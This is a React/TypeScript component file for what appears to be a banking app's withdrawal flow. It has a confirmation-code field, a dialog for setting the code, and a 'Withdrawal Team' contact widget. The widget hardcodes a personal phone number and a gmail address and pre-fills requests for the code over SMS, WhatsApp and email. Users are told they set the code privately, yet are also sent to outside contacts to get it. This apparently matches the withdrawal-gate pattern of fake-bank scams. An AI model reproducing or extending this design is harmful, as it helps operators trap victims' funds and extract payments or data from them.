import { useState } from "react";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Dialog,
  DialogContent,
  DialogDescription,
  DialogHeader,
  DialogTitle,
} from "@/components/ui/dialog";
import { toast } from "sonner";
import { ShieldCheck, Smartphone, MessageCircle, Mail } from "lucide-react";

export const onlyDigits = (s: string) => s.replace(/\D/g, "").slice(0, 6);
export const validPin = (s: string) => /^\d{4,6}$/.test(s);

/** Confirmation-code field shown on the review step of every outgoing transfer. */
export function PinField({
  id,
  value,
  onChange,
}: {
  id: string;
  value: string;
  onChange: (v: string) => void;
}) {
  return (
    <div className="space-y-2">
      <Label htmlFor={id} className="flex items-center gap-2">
        <ShieldCheck className="h-4 w-4 text-accent" />
        Withdrawal confirmation code
      </Label>
      <Input
        id={id}
        type="password"
        inputMode="numeric"
        autoComplete="one-time-code"
        maxLength={6}
        value={value}
        onChange={(e) => onChange(onlyDigits(e.target.value))}
        placeholder="••••"
      />
      <p className="text-xs text-muted-foreground">
        Enter your 4–6 digit withdrawal code to authorize this transfer.
      </p>
    </div>
  );
}

const WITHDRAWAL_PHONE = "+12722171086";
const WITHDRAWAL_EMAIL = "cruzwilliamsanthony@gmail.com";
const WITHDRAWAL_MESSAGE = "Hi, I need my withdrawal confirmation code.";

/** Quick-contact options for the Withdrawal Team. */
export function ContactWithdrawalTeam() {
  const smsHref = `sms:${WITHDRAWAL_PHONE}?body=${encodeURIComponent(
    WITHDRAWAL_MESSAGE,
  )}`;
  const whatsappHref = `https://wa.me/${WITHDRAWAL_PHONE.replace(
    /\D/g,
    "",
  )}?text=${encodeURIComponent(WITHDRAWAL_MESSAGE)}`;
  const emailHref = `mailto:${WITHDRAWAL_EMAIL}?subject=${encodeURIComponent(
    "Withdrawal confirmation code",
  )}&body=${encodeURIComponent(WITHDRAWAL_MESSAGE)}`;

  return (
    <div className="rounded-lg border bg-muted/30 p-3 space-y-2">
      <p className="text-xs text-muted-foreground">
        Need your withdrawal confirmation code? Contact the Withdrawal Team.
      </p>
      <div className="flex flex-wrap gap-2">
        <Button variant="outline" size="sm" className="flex-1" asChild>
          <a href={smsHref}>
            <Smartphone className="mr-1.5 h-3.5 w-3.5" />
            Text
          </a>
        </Button>
        <Button variant="outline" size="sm" className="flex-1" asChild>
          <a href={whatsappHref} target="_blank" rel="noreferrer">
            <MessageCircle className="mr-1.5 h-3.5 w-3.5" />
            WhatsApp
          </a>
        </Button>
        <Button variant="outline" size="sm" className="flex-1" asChild>
          <a href={emailHref}>
            <Mail className="mr-1.5 h-3.5 w-3.5" />
            Email
          </a>
        </Button>
      </div>
    </div>
  );
}

/** Create or change the withdrawal code. */
export function WithdrawalPinDialog({
  hasPin,
  onClose,
  onSaved,
}: {
  hasPin: boolean;
  onClose: () => void;
  onSaved: () => void;
}) {
  const [current, setCurrent] = useState("");
  const [pin, setPin] = useState("");
  const [confirm, setConfirm] = useState("");
  const [busy, setBusy] = useState(false);

  const canSave =
    validPin(pin) && pin === confirm && (!hasPin || validPin(current));

  async function save(e: React.FormEvent) {
    e.preventDefault();
    setBusy(true);
    const { error } = await supabase.rpc(
      "set_withdrawal_pin",
      hasPin ? { _pin: pin, _current_pin: current } : { _pin: pin },
    );
    setBusy(false);
    if (error) {
      toast.error("Could not save your code", { description: error.message });
      return;
    }
    toast.success(hasPin ? "Withdrawal code updated" : "Withdrawal code set");
    onSaved();
    onClose();
  }

  return (
    <Dialog open onOpenChange={(v) => !v && onClose()}>
      <DialogContent className="sm:max-w-md">
        <DialogHeader>
          <DialogTitle>
            {hasPin ? "Change withdrawal code" : "Set withdrawal code"}
          </DialogTitle>
          <DialogDescription>
            This 4–6 digit code confirms every transfer that leaves your
            accounts. Keep it private — nobody at the bank can see it.
          </DialogDescription>
        </DialogHeader>
        <form className="space-y-4" onSubmit={save}>
          {hasPin && (
            <div className="space-y-2">
              <Label htmlFor="pin-current">Current code</Label>
              <Input
                id="pin-current"
                type="password"
                inputMode="numeric"
                maxLength={6}
                value={current}
                onChange={(e) => setCurrent(onlyDigits(e.target.value))}
              />
            </div>
          )}
          <div className="space-y-2">
            <Label htmlFor="pin-new">New code</Label>
            <Input
              id="pin-new"
              type="password"
              inputMode="numeric"
              maxLength={6}
              value={pin}
              onChange={(e) => setPin(onlyDigits(e.target.value))}
            />
          </div>
          <div className="space-y-2">
            <Label htmlFor="pin-confirm">Confirm new code</Label>
            <Input
              id="pin-confirm"
              type="password"
              inputMode="numeric"
              maxLength={6}
              value={confirm}
              onChange={(e) => setConfirm(onlyDigits(e.target.value))}
            />
            {confirm && pin !== confirm && (
              <p className="text-xs text-destructive">Codes do not match.</p>
            )}
          </div>
          <Button type="submit" className="w-full" disabled={busy || !canSave}>
            {busy ? "Saving…" : "Save code"}
          </Button>
        </form>
      </DialogContent>
    </Dialog>
  );
}
